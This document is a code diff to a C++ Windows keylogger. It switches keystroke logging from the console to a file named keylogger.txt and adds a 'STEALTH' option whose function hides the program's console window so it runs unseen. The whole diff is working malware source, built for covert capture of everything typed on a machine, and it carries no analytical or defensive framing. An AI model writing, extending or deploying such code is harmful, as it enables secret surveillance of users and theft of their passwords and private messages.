@@ -14,7 +14,13 @@ LOG_MODE:
 == 0 => log on console
 == 1 => log in file
 */ 
-#define LOG_MODE 0
+#define LOG_MODE 1
+/*
+STEALTH:
+== 0 => donot hide window
+== 1 => hide window
+*/
+#define STEALTH 0
 
 #if LOG_MODE == 1
 std::ofstream log_file;
@@ -27,7 +33,7 @@ const std::map<int, std::string> keyname{
 	{VK_CAPITAL, "<CAPSLOCK>" },
     {VK_BACK, "<BACKSPACE>" },
 	{VK_RETURN,	"\n" },
-	{VK_SPACE,	"_" },
+	{VK_SPACE,	" " },
 	{VK_TAB,	"<TAB>" },
 	{VK_SHIFT,	"<SHIFT>" },
 	{VK_LSHIFT,	"<LSHIFT>" },
@@ -177,10 +183,14 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-
+void Stealth()
+{
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+}
 
 
 int main(){
+
 
     #if LOG_MODE == 1
     const char* log_filename = "keylogger.txt";
@@ -194,6 +204,10 @@ int main(){
     if(hook == NULL){
         std::cout<<"can\'t create hook\n";
     }
+
+    #if STEALTH == 1
+    Stealth();
+    #endif
 
     // loop to keep the console application running.
 	/*
